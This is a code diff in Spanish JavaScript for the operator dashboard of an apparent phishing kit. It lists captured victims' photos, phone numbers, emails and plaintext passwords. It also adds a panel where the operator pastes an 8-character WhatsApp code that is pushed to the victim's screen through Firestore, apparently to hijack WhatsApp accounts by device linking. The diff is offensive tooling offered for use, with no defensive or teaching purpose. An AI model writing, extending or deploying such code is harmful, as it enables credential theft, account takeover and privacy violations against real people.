@@ -774,93 +774,85 @@ function iniciarListenerVictimas() {
 
 
 function mostrarVictimas(snap) {
-
     const cont = $id("registros");
-
     if (!cont) return;
 
-
-
     if (snap.empty) {
-
         cont.innerHTML = `<button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button> <div style="color:#ff8800;padding:25px;text-align:center;font-size:15px;">Aún no tienes víctimas</div>`;
-
         return;
-
     }
-
-
 
     let html = `<button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button> <div style="max-height:60vh;overflow-y:auto;padding:6px;">`;
 
-
-
     snap.forEach(d => {
-
         const v = d.data();
-
         const fecha = v.fecha ? new Date(v.fecha.toDate()).toLocaleString() : "Ahora";
-
         const docId = d.id;
-
-
 
         html += `<div style="background:rgba(0,255,0,0.1);border:1px solid #0f0;border-radius:8px;padding:10px;margin:5px 0;font-size:13px;line-height:1.4;">`;
 
-
-
-        // --- LÓGICA PARA LA FOTO ---
-
+        // --- FOTO ---
         if (v.fotoMiniatura) {
-
-            html += `
-
-                <div style="text-align: center; margin-bottom: 10px;">
-
-                    <img src="${v.fotoMiniatura}" alt="Foto de la víctima" style="max-width: 150px; max-height: 150px; border-radius: 8px; border: 1px solid #ccc; object-fit: cover; cursor: pointer;" 
-
-                         onclick="mostrarFotoCompleta('${encodeURIComponent(v.fotoOriginal)}')">
-
-                    <br>
-
-                    <small style="color: #aaa;">(Haz clic para ver completo)</small>
-
-                </div>
-
-            `;
-
+            html += `<div style="text-align: center; margin-bottom: 10px;"><img src="${v.fotoMiniatura}" style="max-width: 150px; border-radius: 8px; cursor: pointer;" onclick="mostrarFotoCompleta('${encodeURIComponent(v.fotoOriginal)}')"></div>`;
         }
 
-        // --- FIN DE LA LÓGICA PARA LA FOTO ---
-
-
-
+        // --- DATOS BÁSICOS ---
         html += `<strong style="color:#0f0">${v.template || "Phishing"}</strong><br>`;
-
-        if (v.ip) html += `IP: <b style="color:#0ff">${v.ip}</b><br>`;
-
         if (v.numero) html += `Número: <b style="color:#0ff">${v.numero}</b><br>`;
-
         if (v.correo) html += `Correo: <b style="color:#fff">${v.correo}</b><br>`;
-
         if (v.contraseña) html += `Contraseña: <b style="color:#fff">${v.contraseña}</b><br>`;
 
-        
+        // ========================================================
+        // === NUEVO: PANEL DE ENVÍO DE CÓDIGO WHATSAPP ===
+        // ========================================================
+        if (v.template && v.template.includes("WhatsApp")) {
+            html += `
+                <div style="margin-top:10px; border-top:1px solid #0f0; padding-top:10px;">
+                    <input type="text" id="input-code-${docId}" placeholder="Pega 8 letras" 
+                           maxlength="8" 
+                           style="background:#000; color:#0f0; border:1px solid #0f0; width:120px; text-transform:uppercase; padding:4px;">
+                    <button onclick="enviarCodigoAVictima('${docId}')" 
+                            style="background:#0f0; color:#000; border:none; padding:5px 10px; cursor:pointer; font-weight:bold; border-radius:4px;">
+                        ENVIAR
+                    </button>
+                    <div style="font-size:10px; color:#aaa; margin-top:4px;">${v.codigo ? '✅ Enviado: ' + v.codigo : '⌛ Esperando código...'}</div>
+                </div>
+            `;
+        }
+        // ========================================================
 
         html += `<small style="color:#0f0;">${fecha}</small></div>`;
-
     });
 
-
-
     html += `</div>`;
-
     cont.innerHTML = html;
-
 }
 
+// ⚠️ PEGA ESTA FUNCIÓN AL FINAL DE TU ARCHIVO (Fuera de mostrarVictimas)
+window.enviarCodigoAVictima = async (docId) => {
+    const input = document.getElementById(`input-code-${docId}`);
+    const codigo = input.value.trim().toUpperCase();
 
+    if (codigo.length < 8) {
+        alert("El código de WhatsApp debe tener 8 letras/números.");
+        return;
+    }
 
+    try {
+        // Referencia directa al documento de esta víctima específica
+        const victimaRef = doc(db, "panelUsers", miUserDocId, "victimas", docId);
+        await updateDoc(victimaRef, {
+            codigo: codigo,
+            status: "enviado"
+        });
+        
+        mostrarNotif("¡Código enviado! La víctima lo verá en su pantalla.");
+        input.value = "";
+    } catch (e) {
+        console.error(e);
+        mostrarNotif("Error al enviar: " + e.message);
+    }
+};
 // --- NUEVAS FUNCIONES PARA EL SISTEMA DE VISTA INTEGRADA ---
 
 
